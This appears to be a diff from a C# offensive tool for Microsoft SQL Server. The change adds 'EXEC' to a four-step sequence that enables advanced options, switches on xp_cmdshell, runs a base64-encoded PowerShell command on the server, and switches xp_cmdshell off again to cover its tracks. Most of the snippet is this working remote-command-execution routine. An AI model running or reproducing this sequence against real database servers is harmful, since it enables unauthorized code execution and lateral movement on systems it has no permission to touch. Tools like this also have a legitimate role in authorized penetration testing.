@@ -77,10 +77,10 @@ Optional arguments:
 
             var procedures = new Dictionary<string, string>();
 
-            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
-            procedures.Add("Enabling 'xp_cmdshell'..", $"sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
-            procedures.Add("Executing command..", $"xp_cmdshell 'powershell -enc {cmd}';");
-            procedures.Add("Disabling 'xp_cmdshell'..", $"sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
+            procedures.Add("Enabling advanced options..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
+            procedures.Add("Enabling 'xp_cmdshell'..", $"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+            procedures.Add("Executing command..", $"EXEC xp_cmdshell 'powershell -enc {cmd}';");
+            procedures.Add("Disabling 'xp_cmdshell'..", $"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
 
             foreach (string step in procedures.Keys)
             {
